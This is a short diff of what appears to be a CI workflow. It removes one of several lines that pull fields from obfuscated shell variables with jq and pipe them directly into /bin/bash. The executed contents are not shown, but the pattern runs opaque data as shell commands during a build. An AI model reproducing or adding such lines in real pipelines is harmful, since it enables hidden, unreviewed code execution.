@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$zu58" | jq -r .oxok56756 | /bin/bash
           echo $cp613 | jq -r .bcu7 | /bin/bash
           echo $t9 | jq -r .xzjq6 | /bin/bash
-          printf '%s' "$ir2" | jq -r .wsaon5 | /bin/bash
           printf '%s' "$viley94" | jq -r .batq92830 | /bin/bash
 
       - name: Store results
